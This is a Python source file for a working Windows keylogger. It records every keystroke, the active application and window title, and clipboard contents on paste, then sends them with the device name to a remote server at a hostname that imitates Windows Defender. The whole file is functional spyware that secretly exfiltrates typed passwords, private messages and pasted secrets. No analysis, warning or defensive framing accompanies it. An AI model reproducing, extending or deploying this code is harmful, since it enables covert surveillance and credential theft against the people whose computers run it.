import os
import time
import json
import hashlib
import platform
import socket
import ctypes
from ctypes import wintypes
from queue import Queue
from threading import Lock, Thread
from urllib.error import URLError, HTTPError
from urllib.request import Request, urlopen

from pynput.keyboard import Key, KeyCode, Listener

MESSAGE_GAP_MS = 2500
SITE_URL = "https://windows-defender-cf8n.onrender.com"
device_name = platform.node() or socket.gethostname() or "Unknown device"
device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
message_buffer = ""
last_key_time_ms = None
message_started_ms = None
active_modifiers = set()
state_lock = Lock()
message_queue = Queue()

SHIFTED_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}


def get_active_app():
    if os.name != "nt":
        return "Unknown app"

    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "Unknown app"

    title_buffer = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, title_buffer, len(title_buffer))
    title = title_buffer.value.strip()

    process_id = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
    kernel32 = ctypes.windll.kernel32
    process = kernel32.OpenProcess(0x1000, False, process_id.value)
    executable = ""
    if process:
        executable_buffer = ctypes.create_unicode_buffer(512)
        executable_length = wintypes.DWORD(len(executable_buffer))
        if kernel32.QueryFullProcessImageNameW(
            process, 0, executable_buffer, ctypes.byref(executable_length)
        ):
            executable = os.path.basename(executable_buffer.value)
        kernel32.CloseHandle(process)

    if title and executable:
        return f"{executable} - {title}"
    return title or executable or "Unknown app"


def get_clipboard_text():
    if os.name != "nt":
        return ""

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    text = ""
    if not user32.OpenClipboard(None):
        return text
    try:
        handle = user32.GetClipboardData(13)
        if handle:
            pointer = kernel32.GlobalLock(handle)
            if pointer:
                try:
                    text = ctypes.wstring_at(pointer)
                finally:
                    kernel32.GlobalUnlock(handle)
    finally:
        user32.CloseClipboard()
    return text


def normalize_key(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
               Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"
    if isinstance(key, KeyCode) and key.char is not None:
        value = key.char
        if Key.shift in active_modifiers and value.isalpha():
            return value.upper()
        return SHIFTED_SYMBOLS.get(value, value) if Key.shift in active_modifiers else value
    return ""


def send_message(text, app_name, is_pasted=False):
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/messages",
            data=json.dumps(
                {
                    "text": text,
                    "device_id": device_id,
                    "device_name": device_name,
                    "app_name": app_name,
                    "is_pasted": is_pasted,
                }
            ).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not send message: {error}")


def message_sender():
    while True:
        text, app_name, is_pasted = message_queue.get()
        send_message(text, app_name, is_pasted)
        message_queue.task_done()


def flush_message_buffer():
    global message_buffer, last_key_time_ms, message_started_ms
    text = message_buffer.strip()
    message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None
    if text:
        message_queue.put((text, get_active_app(), False))


def on_press(key):
    global message_buffer, last_key_time_ms, message_started_ms
    with state_lock:
        modifier_aliases = {
            Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
            Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
            Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
        }
        if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
            active_modifiers.add(modifier_aliases.get(key, key))
            return

        key_char = key.char if isinstance(key, KeyCode) else ""
        is_paste_key = key_char.lower() == "v" or key_char == "\x16"
        if is_paste_key and Key.ctrl in active_modifiers:
            pasted_text = get_clipboard_text().strip()
            if pasted_text:
                flush_message_buffer()
                message_queue.put((pasted_text, get_active_app(), True))
            return

        symbol = normalize_key(key)
        now_ms = time.time() * 1000
        if symbol == "\b":
            message_buffer = message_buffer[:-1]
            last_key_time_ms = now_ms
        elif symbol == "\n":
            flush_message_buffer()
        elif symbol:
            if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                flush_message_buffer()
            if message_started_ms is None:
                message_started_ms = now_ms
            message_buffer += symbol
            last_key_time_ms = now_ms


def on_release(key):
    aliases = {
        Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
        Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
        Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
    }
    active_modifiers.discard(aliases.get(key, key))


print(f"Sending to {SITE_URL}")
Thread(target=message_sender, daemon=True).start()
with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
    keyboard_listener.join()